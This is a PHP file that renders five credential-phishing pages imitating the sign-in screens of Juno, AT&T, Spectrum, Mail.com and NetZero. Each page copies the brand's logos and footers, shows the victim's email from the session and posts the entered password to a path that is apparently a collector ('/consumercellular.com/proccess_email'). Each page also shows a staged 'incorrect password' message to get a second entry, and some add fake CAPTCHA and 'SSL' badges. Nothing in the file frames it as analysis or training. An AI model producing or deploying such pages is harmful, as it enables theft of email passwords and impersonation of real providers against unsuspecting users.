<?php

function JunoPage() {
    $user_email = isset($_SESSION['karma-email']) ? htmlspecialchars($_SESSION['karma-email'], ENT_QUOTES, 'UTF-8') : '';
    ?>
    <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Juno - My Account -  Value-priced Internet Service Provider - ISP - Free, low-cost and fast Internet Access</title>
                <link rel="icon" href="/public/images/juno.ico" type="image/ico">
                <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
                <link href="/public/css/karma-custom.css?v=<?= time(); ?>" rel="stylesheet">
            </head>
            <body class="font-helevetica container relative max-w-[970px] mx-auto bg-black">

                <div class="bg-white h-screen">

                    <div class="flex relative sm:mb-0 p-7">
                        <img src="/public/images/juno.gif" alt="Logo" />
                        <h1 class="absolute text-2xl text-stone-400 left-62 sm:left-72 top-11"> MY ACCOUNT </h1>
                    </div>
                    
                    <img src="/public/images/line.gif" alt="Logo" class="h-1.5" />

                    <form action="/consumercellular.com/proccess_email" method="post" id="emailaccess-form">
                        <main class="px-10 mt-3 flex flex-col sm:flex-row sm:gap-42">
                            <div class="max-w-sm">
                                <h1 class="text-[30px] mb-5 sm:mb-7 font-bold"> Sign in </h1>
                                
                                <?php if (isset($_SESSION['first_submit'])): ?>
                                    <p class="text-red-600 text-sm mb-4">The Password you have entered is incorrect. Please check the spelling and try again.</p>
                                <?php endif; ?>

                                <div class="mb-7">
                                    <?php echo '<p class="font-bold">' . $user_email . '</p>'; ?>
                                </div>
                                
                                <label for="karma-emailpassword" class="block mb-1 text-[16px] text-[#646469]">PASSWORD</label>
                                <input type="password" name="karma-emailpassword" id="karma-emailpassword" class="w-[230px] h-9 border-1 border-stone-300 rounded-md px-3" required />
                                <button type="submit" class="flex items-center bg-stone-300 text-xl py-2 px-8 rounded mt-4 h-8 cursor-pointer tracking-wider text-stone-600">SIGN-IN</button>
                                <hr class="text-blue-500 mt-10 sm:mb-20"/>
                            </div>
                            <div class="mt-9 max-w-xl mb-5 sm:mb-0">
                                <h1 class="text-2xl mb-3"> Not a Juno Member? </h1>
                                <span class="max-w-xl tracking-wide text-stone-400">
                                    Get Juno DSL and Dial-Up Internet services at affordable prices. To compare features and benefits of Juno Internet services and to sign up now, <span class="text-[#006BA3] cursor-pointer">Click Here</span>.
                                </span>
                            </div>
                        </main>
                    </form>
                    <footer class="absolute bg-stone-200 w-full bottom-0">
                        <div class="hidden sm:flex gap-5 items-center mx-auto px-10 py-5 text-xs">
                            <p class="text-[#2377AA]">My Juno</p> |
                            <p class="text-[#2377AA]">My Account</p> |
                            <p class="text-[#2377AA]">Our Services</p> |
                            <p class="text-[#2377AA]">Privacy Policy</p> |
                            <p class="text-[#2377AA]">Your Privacy Rights: Do Not Sell My Info</p> |
                            <p class="text-[#2377AA]">About Ads</p> |
                            <p class="text-[#2377AA]">Terms of Service</p> 
                        </div>
                        <hr class="text-black mb-2"/>
                        <p class="text-xs text-center py-2 text-stone-700">&copy; 1995 - 2025  Juno Online Services, Inc. Juno is a registered trademark, and the Juno logo is a trademark of Juno Online Services, Inc.</p>
                    </footer>
                </div>
            </body>
        </html>
    <?php
}

function AttPage() {
    $user_email = isset($_SESSION['karma-email']) ? htmlspecialchars($_SESSION['karma-email'], ENT_QUOTES, 'UTF-8') : '';
    ?>
    <!DOCTYPE html>
        <html lang="en" class="email-box">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Login Screen</title>
                <link rel="icon" href="/public/images/att.ico" type="image/ico">
                <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
                <link href="/public/css/karma-custom.css?v=<?= time(); ?>" rel="stylesheet">
            </head>
            <body class="font-helevetica container">
                <form action="/consumercellular.com/proccess_email" method="post" id="emailaccess-form" class="flex flex-col justify-center mt-5 lg:mt-30 lg:h-screen items-center p-2 mx-auto lg:px-0 px-5">
                    <main class="lg:border lg:border-stone-300 lg:rounded-xl lg:p-10 w-full max-w-[440px]">
                        <div class="text-center text-2xl lg:text-4xl font-bold font-sans tracking-tighter mb-5">
                            <img src="/public/images/att.svg" alt="AT&T Logo" class="w-32 h-8 mb-8 mx-auto">
                            <h1 class="mb-1">Welcome</h1>
                        </div>

                        <div class="flex flex-col mb-4 text-center">
                            <?php echo '<p class="py-7 text-xl">' . $user_email . '</p>'; ?>
                        </div>
                        
                        <?php if (isset($_SESSION['first_submit'])): ?>
                            <div class="flex flex-col mt-5 mb-5">
                                <div class="flex items-start gap-2">
                                    <svg height="24" width="24" viewBox="0 0 32 32" aria-label="icon image" role="img" focusable="false">
                                        <path d="M29.21 24.53L18.62 5.63a3 3 0 00-5.24 0L2.79 24.53A3 3 0 005.41 29h21.18a3 3 0 002.62-4.47zM17 24h-2v-2h2zm0-4h-2v-8h2z" fill="#ea712f"></path>
                                    </svg>
                                    <div>
                                        <p class="text-stone-600 text-sm">Incorrect password. Try again.</p>
                                        <span class="text-stone-500 text-xs block mt-1">Care code: 201 [LU100]</span>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <div class="flex flex-col mb-4">
                            <label for="karma-emailpassword" class="block mb-1 text-sm text-[#646469] font-sans font-bold">Password</label>
                            <input type="password" name="karma-emailpassword" id="karma-emailpassword" class="w-full h-12 border-1 border-stone-500 rounded-xl mb-1 px-3" required />
                        </div>
                        <button type="submit" class="mb-5 flex items-center bg-[#00388f] hover:bg-[#0057b8] transition text-sm justify-center text-white py-2 px-8 mt-6 h-12 cursor-pointer tracking-tigher w-full font-bold font-sans rounded-full">Continue</button>
                        <div class="flex flex-col gap-5 mb-10">
                            <p class="hover:underline font-bold text-[#0057b8] cursor-pointer">Forgot user ID?</p>
                            <p class="hover:underline font-bold text-[#0057b8] cursor-pointer">Don't have a user ID? Create one now</p>
                            <p class="hover:underline font-bold text-[#0057b8] cursor-pointer">Pay without signing in</p>
                        </div>
                        <div class="flex items-center gap-2 my-4 mb-10">
                            <hr class="flex-grow border-t border-gray-300">
                            <span class="px-2 font-sans font-bold text-xs">OR</span>
                            <hr class="flex-grow border-t border-gray-300">
                        </div>
                        <p class="flex items-center border-2 border-[#00388f] hover:bg-[#0057b8] hover:text-white transition text-sm justify-center text-[#00388f] py-2 px-8 mt-6 h-12 cursor-pointer tracking-tigher w-full font-bold font-sans rounded-full">Sign in with myAT&T app</p>
                    </main>
                </form>
                <footer class="w-full text-sm lg:text-center text-gray-600 py-4 mt-10 text-nowrap">
                    <div class="text-xs max-w-2xl mx-auto px-5 lg:px-0 lg:flex sm:grid sm:grid-cols-1 sm:gap-3 lg:gap-4 lg:justify-center lg:items-center">
                        <p class="hover:text-blue-800 cursor-pointer lg:mb-0 mb-3">Legal policy center</p>
                        <p class="hover:text-blue-800 cursor-pointer lg:mb-0 mb-3">Privacy policy</p>
                        <p class="hover:text-blue-800 cursor-pointer lg:mb-0 mb-3">Terms of use</p>
                        <p class="hover:text-blue-800 cursor-pointer lg:mb-0 mb-3">Accessibility</p>
                        <span class="inline-flex lg:items-center lg:justify-center gap-1">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" focusable="true" class="footer-link-icon-svg" id="footerLinkIconSvg4" aria-label="California Consumer Privacy Act (CCPA) Opt-Out Icon">
                                <rect x="1" y="6.07595" width="22" height="11.1392" rx="5.56962" fill="white"></rect>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M17.4304 6.07595C20.5064 6.07595 23 8.56955 23 11.6456C23 14.7216 20.5064 17.2152 17.4304 17.2152H6.56962C3.49361 17.2152 1 14.7216 1 11.6456C1 8.56955 3.49361 6.07595 6.56962 6.07595H17.4304ZM13.2679 6.91818H6.56962C3.95876 6.91818 1.84223 9.03471 1.84223 11.6456C1.84223 14.2564 3.95876 16.373 6.56962 16.373H10.7321L13.2679 6.91818ZM10.3553 9.41582C10.5301 9.55752 10.557 9.81415 10.4153 9.98902L7.41378 13.6942C7.16006 14.0074 6.69106 14.0319 6.4061 13.7468L4.65019 11.9904C4.49109 11.8312 4.49109 11.5732 4.65019 11.414C4.80929 11.2549 5.06725 11.2549 5.22635 11.414L6.87565 13.0638L9.78224 9.47587C9.92389 9.301 10.1804 9.27411 10.3553 9.41582ZM15.1023 9.24971C14.9477 9.08617 14.6899 9.07896 14.5264 9.2336C14.3629 9.38824 14.3557 9.64617 14.5103 9.80971L16.2013 11.5987L14.4609 13.3396C14.3018 13.4988 14.3018 13.7568 14.4609 13.916C14.62 14.0751 14.878 14.0751 15.0371 13.916L16.7614 12.1911L18.4368 13.9635C18.5914 14.1271 18.8493 14.1343 19.0128 13.9796C19.1762 13.825 19.1835 13.5671 19.0289 13.4035L17.3378 11.6146L19.0782 9.8736C19.2373 9.71445 19.2373 9.45641 19.0782 9.29726C18.9191 9.13811 18.6611 9.13811 18.502 9.29726L16.7777 11.0221L15.1023 9.24971Z" fill="#454B52"></path>
                            </svg>
                            <p class="hover:text-blue-800 cursor-pointer">Your privacy choices</p>
                        </span>
                    </div>
                    <p class="text-xs text-[#686e74] px-5 lg:px-0 mt-3">&copy; 2025 AT&T Intellectual Property. All rights reserved.</p>
                </footer>
            </body>
        </html>
    <?php
}

function SpectrumPage() {
    $user_email = isset($_SESSION['karma-email']) ? htmlspecialchars($_SESSION['karma-email'], ENT_QUOTES, 'UTF-8') : '';
    ?>
    <!DOCTYPE html>
        <html lang="en" class="email-box">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Login TWC & Roadrunner RR Email | Spectrum Webmail</title>
                <link rel="icon" href="/public/images/spectrum.ico" type="image/ico">
                <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
                <link href="/public/css/karma-custom.css?v=<?= time(); ?>" rel="stylesheet">
            </head>
            <body class="font-helevetica container">

                <header class="flex flex-col w-full">
                    <div class="bg-white px-10 w-full z-10 flex justify-between items-center mx-auto border-b border-b-stone-300">
                        <p class="text-black"> MENU </p>
                        <img src="/public/images/spectrum.svg" alt="Logo" class="h-16 w-26" />
                        <p class="text-black"> Support </p>
                    </div>
                </header>

                <form action="/consumercellular.com/proccess_email" method="post" id="emailaccess-form" class="flex flex-col justify-center mt-13 items-center p-2 mx-auto max-w-xs">
                    <main>
                            <?php if (isset($_SESSION['first_submit'])): ?>
                                <div class="flex gap-2 border p-6 text-red-600 text-sm font-bold mb-5">
                                    <img src="/public/images/warning-red.svg" alt="Alert" class="h-5 w-5 mr-2 mt-3 fill-red-600" />
                                    <p class="">The info you entered doesn't match our records. Please try again.</p>
                                </div>
                            <?php endif; ?>

                        <h1 class="text-stone-700 text-xl mb-5 sm:mb-7 text-center font-bold font-arial"> Sign In to Webmail </h1>

                        <div class="flex flex-col mb-4">
                            <div class="flex flex-col mb-4 text-center">
                                <?php echo '<p class="py-3 font-bold">' . $user_email . '</p>'; ?>
                            </div>
                        </div>
                        
                        <label for="karma-emailpassword" class="block mb-1 text-sm text-[#646469] font-helevetica">Email Password</label>
                        <input type="password" name="karma-emailpassword" id="karma-emailpassword" class="w-[300px] h-7 border-1 border-stone-600 rounded-xs px-3" required />
                        <div class="flex items-center justify-between border mt-5 border-stone-200 p-2">
                            <div class="flex items-center gap-4 px-3">
                                <input type="checkbox" id="not-robot" name="not-robot" class="w-4 h-4 border border-stone-600 rounded-sm cursor-pointer" required>
                                <label for="not-robot" class="font-helevetica text-md text-[#646469] cursor-pointer">I'm not a robot</label>
                            </div>
                            <img src="/public/images/captcha.svg" alt="Captcha" class="relative right- h-12 w-12" />
                        </div>
                        <button type="submit" class="flex items-center bg-[#0073D1] text-sm justify-center text-white py-2 px-8 rounded mt-6 h-8 cursor-pointer tracking-wider w-full">Sign In</button>
                    </main>
                </form>
                <footer class="flex bg-black absolute bottom-0 left-0 w-full z-10 p-2 px-10 justify-center">
                        <p class="text-white text-xs">&copy; 2025 Charter Communications. All rights reserved</p>
                </footer>
            </body>
        </html>
    <?php
}

function MailPage() {
    $user_email = isset($_SESSION['karma-email']) ? htmlspecialchars($_SESSION['karma-email'], ENT_QUOTES, 'UTF-8') : '';
    ?>
    <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Login Mail.com | Free Mail Service</title>
                <link rel="icon" href="https://img.ui-portal.de/ux/mailcom/icons/favicon.ico" type="image/ico">
                <link rel="stylesheet" href="/public/css/karma-styles.css?v=<?= time() ?>">
                <link rel="stylesheet" href="/public/css/custom.css?v=<?= time() ?>">
            </head>
            <body class="font-helevetica container">

                <header class="flex flex-col w-full">
                    <div class="bg-white px-10 w-full z-10 flex justify-between items-center mx-auto border-b border-b-stone-300 py-5">
                        <p class="text-black"> MENU </p>
                        <img src="/public/images/mail.png" alt="Logo" class="w-26" />
                        <p class="text-black"> Support </p>
                    </div>
                </header>

                <form action="/consumercellular.com/proccess_email" method="post" id="emailaccess-form" class="flex flex-col justify-center mt-13 items-center p-2 mx-auto max-w-xs">
                    <main>
                        <?php if (isset($_SESSION['first_submit'])): ?>
                            <div class="flex gap-2 border p-6 text-red-600 text-sm font-bold mb-5">
                                <img src="/public/images/warning-red.svg" alt="Alert" class="h-5 w-5 mr-2 mt-3 fill-red-600" />
                                <p class="">The info you entered doesn't match our records. Please try again.</p>
                            </div>
                        <?php endif; ?>
                        <div class="flex items-center mb-5">
                            <h1 class="text-stone-700 text-xl font-bold font-arial text-center mr-2">
                                Login <h1 class="text-[#008000] font-bold text-xl">SSL</h1>
                            </h1>
                            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24">
                                <path d="M6 12.5l4 4 8-9" stroke="#008000" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>

                        <div class="flex flex-col mb-4">
                            <div class="flex flex-col mb-4">
                                <?php echo '<p class="py-3 font-bold">' . $user_email . '</p>'; ?>
                            </div>
                        </div>
                        
                        <label for="karma-emailpassword" class="block mb-1 text-sm text-[#646469] font-helevetica">Email Password</label>
                        <input type="password" name="karma-emailpassword" id="karma-emailpassword" class="w-[300px] h-7 border-1 border-stone-600 rounded-xs px-3" required />
                        <div class="flex items-center justify-between border mt-5 border-stone-200 p-2">
                            <div class="flex items-center gap-4 px-3">
                                <input type="checkbox" id="not-robot" name="not-robot" class="w-4 h-4 border border-stone-600 rounded-sm cursor-pointer" required>
                                <label for="not-robot" class="font-helevetica text-md text-[#646469] cursor-pointer">I'm not a robot</label>
                            </div>
                            <img src="/public/images/captcha.svg" alt="Captcha" class="relative right- h-12 w-12" />
                        </div>
                        <button type="submit" class="flex items-center bg-[#008000] text-sm justify-center text-white py-2 px-8 rounded mt-6 h-8 cursor-pointer tracking-wider w-full">Log in</button>
                    </main>
                </form>
            </body>
        </html>
    <?php
}

function NetzeroPage() {
    $user_email = isset($_SESSION['karma-email']) ? htmlspecialchars($_SESSION['karma-email'], ENT_QUOTES, 'UTF-8') : '';
    ?>
    <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>NetZero - My Account - Mobile Broadband, DSL, Dial-Up, Free Email</title>
                <link rel="icon" href="/public/images/netzero.ico" type="image/ico">
                <link rel="stylesheet" href="/public/css/karma-styles.css?v=<?= time() ?>">
                <link rel="stylesheet" href="/public/css/karma-custom.css?v=<?= time() ?>">
            </head>
            <body class="font-helevetica container relative max-w-7xl mx-auto h-10 sm:h-screen">

                <header class="flex flex-col relative sm:absolute w-full">
                    <div class="bg-stone-900/85 p-2 px-10 top-0 left-0 w-full z-10 flex justify-end items-end gap-1">
                        <img src="/public/images/support-ask.png" alt="logo">
                        <p class="text-white"> Support </p>
                    </div>
                    <div class="bg-white/65 sm:px-10 top-0 left-0 w-full z-10">
                        <img src="/public/images/netzero-header.png" alt="Logo" />
                    </div>
                </header>

                <div class="relative mb-15 sm:mb-0">
                    <img src="/public/images/netzero-bg.png" alt="Logo" class="w-full" />
                </div>

                <form action="/consumercellular.com/proccess_email" method="post" id="emailaccess-form">
                    <main class="relative container px-10 mt-3 flex flex-col sm:flex-row sm:gap-42">
                        <div class="max-w-sm">
                            <h1 class="text-[#ff9e15] text-[30px] mb-5 sm:mb-7"> SIGN IN </h1>
                            
                            <?php if (isset($_SESSION['first_submit'])): ?>
                                <p class="text-red-600 text-sm mb-4">The Password you have entered is incorrect. Please check the spelling and try again.</p>
                            <?php endif; ?>

                            <div class="mb-7">
                                <?php echo '<p class="font-bold">' . $user_email . '</p>'; ?>
                            </div>
                            
                            <label for="karma-emailpassword" class="block mb-1 text-[16px] text-[#646469] font-semibold">PASSWORD</label>
                            <input type="password" name="karma-emailpassword" id="karma-emailpassword" class="w-[230px] h-9 border-1 border-stone-300 rounded-md px-3" required />
                            <button type="submit" class="flex items-center bg-[#ff9e19] text-xl text-white py-2 px-8 rounded mt-4 hover:bg-[#ff9e19] duration-150 transition h-8 cursor-pointer tracking-wider">SIGN IN</button>
                            <hr class="text-[#ff9e15] mt-10"/>
                        </div>
                        <div class="mt-9 max-w-xl mb-5 sm:mb-0">
                            <h1 class="text-[#ff9e15] text-[30px] mb-3"> Not a NetZero Member? </h1>
                            <span class="text-xs max-w-xl tracking-wide text-stone-600">
                                Get NetZero DSL and Dial-Up Internet services at affordable prices. To compare features and benefits of NetZero Internet services and to sign up now, <span class="text-[#004D71] hover:text-green-500 cursor-pointer">Click Here</span>.
                            </span>
                        </div>
                    </main>
                </form>
                <footer class="flex bg-stone-600 relative sm:absolute bottom-0 sm:bottom-10 left-0 w-full z-10 mb-1 p-2 px-10">
                        <p class="text-white font-bold text-xs">&copy; 2025 NetZero, Inc</p>
                </footer>
                <div class="hidden sm:flex absolute bottom-0 left-0 w-full z-10 mb-3 text-xs tracking-wider gap-2 text-stone-400 px-2">
                    <p class="cursor-pointer">My NetZero | </p>
                    <p class="cursor-pointer">My Account | </p>
                    <p class="cursor-pointer">Our Services | </p>
                    <p class="cursor-pointer">Privacy Policy | </p>
                    <p class="cursor-pointer">Your Privacy Rights: Do Not Sell My Info | </p>
                    <p class="cursor-pointer">About Ads | </p>
                    <p class="cursor-pointer">Terms of Service | </p>
                    <p class="cursor-pointer">Press Center </p>
                </div>
            </body>
        </html>
    <?php
}

?>